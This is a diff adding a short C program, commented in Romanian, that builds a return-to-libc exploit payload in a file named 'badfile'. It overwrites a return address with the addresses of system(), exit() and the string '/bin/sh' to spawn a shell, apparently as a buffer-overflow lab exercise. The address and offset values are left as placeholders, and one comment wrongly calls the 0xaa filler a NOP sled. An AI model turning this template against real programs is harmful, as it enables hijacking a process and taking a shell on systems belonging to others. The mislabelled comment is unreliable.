@@ -1,0 +1,60 @@
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+// Definiții pentru adresele funcțiilor (înlocuiește cu adresele corecte)
+unsigned int system_addr = 0x<adresa_system>;  // Adresa funcției system()
+unsigned int exit_addr = 0x<adresa_exit>;      // Adresa funcției exit()
+unsigned int shell_addr = 0x<adresa_shell>;    // Adresa șirului "/bin/sh"
+
+// Offset pentru overwrite-ul adresei de retur (trebuie calculat pe baza analizei stack-ului)
+int ret_addr_offset = <offset_calculat>;
+
+int main() {
+    // Buffer pentru fișierul badfile
+    char buf[300];
+    memset(buf, 0xaa, sizeof(buf)); // Umple buffer-ul cu valori implicite (NOP sled)
+
+    // Suprascrierea adresei de retur cu adresa funcției system()
+    if (ret_addr_offset + 4 <= sizeof(buf)) {
+        memcpy(buf + ret_addr_offset, &system_addr, 4);
+    } else {
+        fprintf(stderr, "Eroare: Offset-ul pentru return address depășește dimensiunea buffer-ului!\n");
+        return 1;
+    }
+
+    // Suprascrierea următoarei adrese cu adresa funcției exit()
+    if (ret_addr_offset + 8 <= sizeof(buf)) {
+        memcpy(buf + ret_addr_offset + 4, &exit_addr, 4);
+    } else {
+        fprintf(stderr, "Eroare: Offset-ul pentru exit address depășește dimensiunea buffer-ului!\n");
+        return 1;
+    }
+
+    // Suprascrierea următoarei adrese cu adresa șirului "/bin/sh"
+    if (ret_addr_offset + 12 <= sizeof(buf)) {
+        memcpy(buf + ret_addr_offset + 8, &shell_addr, 4);
+    } else {
+        fprintf(stderr, "Eroare: Offset-ul pentru shell string depășește dimensiunea buffer-ului!\n");
+        return 1;
+    }
+
+    // Scrierea buffer-ului în fișierul badfile
+    FILE *badfile = fopen("badfile", "w");
+    if (!badfile) {
+        perror("Eroare la deschiderea fișierului badfile");
+        return 1;
+    }
+
+    // Scrierea efectivă a buffer-ului în fișier
+    if (fwrite(buf, sizeof(buf), 1, badfile) != 1) {
+        perror("Eroare la scrierea în fișierul badfile");
+        fclose(badfile);
+        return 1;
+    }
+
+    fclose(badfile);
+    printf("Exploit generat cu succes în badfile!\n");
+
+    return 0;
+}
